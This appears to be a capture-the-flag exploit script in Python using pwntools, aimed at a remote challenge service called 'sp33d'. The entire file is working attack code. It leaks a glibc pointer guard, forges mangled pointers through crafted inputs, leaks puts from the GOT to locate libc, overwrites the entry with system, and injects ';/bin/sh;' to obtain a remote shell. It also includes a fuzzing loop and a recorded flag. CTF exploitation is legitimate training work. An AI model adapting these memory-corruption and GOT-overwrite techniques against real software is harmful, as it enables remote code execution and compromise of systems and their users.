#!/usr/bin/env python3
import random
import re

from pwn import *
import z3

def main():
    prompt = b"\n> "
    # with process(["./sp33d2"]) as tube:
    with remote("sp33d.play.hfsc.tf", 1357) as tube:
        def add(thing):
            print(f"LOG: add({thing})")
            tube.sendlineafter(prompt, b"1")
            tube.sendlineafter(b"thing: ", thing)

        def send_show():
            tube.sendlineafter(prompt, b"2")

        def show():
            send_show()
            return tube.recvuntil(b"\n  ")

        def delete(index):
            print(f"LOG: delete({index})")
            tube.sendlineafter(prompt, b"3")
            tube.sendlineafter(b"index: ", str(index).encode())

        def fuzz():
            while True:
                choice = random.randint(0, 1)
                if choice == 0:
                    if random.randint(0, 1) == 0:
                        add(b"XDEBUG: " + b"A" * random.randint(0, 118))
                    else:
                        add(b"A" * random.randint(0, 126))
                else:
                    delete(random.randint(0, 20))
                if b"corrupt" in show():
                    tube.interactive()

        add(b'XDEBUG: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
        send_show()
        tube.recvuntil(b"corrupt = 0x")
        leak = int(tube.recvline(), 16)
        print(hex(leak))
        pointer_guard = leak ^ ((0x41 >> 17) | (0x41 << 47))
        print(hex(pointer_guard))

        def ptr_mangle(addr):
            addr ^= pointer_guard
            addr = ((addr << 17) & ((1 << 64) - 1)) | (addr >> 47)
            return addr

        data_end = 0x4040f0
        puts_got = 0x404020

        delete(1)
        add(b"XDEBUG: " + b"A" * 48 + struct.pack("<Q", ptr_mangle(data_end)))
        delete(2)
        add(b"\xff\xff\xff\xff\xff\xff")

        delete(1)
        add(b"XDEBUG: ;/bin/sh;" + b"A" * 39 + struct.pack("<Q", ptr_mangle(puts_got)))
        send_show()

        tube.recvuntil(b"thing 2:\n\n\t - ")
        puts, = struct.unpack("<Q", tube.recvn(6) + b"\x00\x00")
        print(hex(puts))
        libc = puts - 0x87be0
        print(hex(libc))
        assert libc & 0xfff == 0
        system = libc + 0x58750

        delete(2)
        add(struct.pack("<Q", system)[:6])
        send_show()
        # midnight{d41d8cd98f00b204e9800998ecf8427e}

        tube.interactive()

if __name__ == "__main__":
    main()
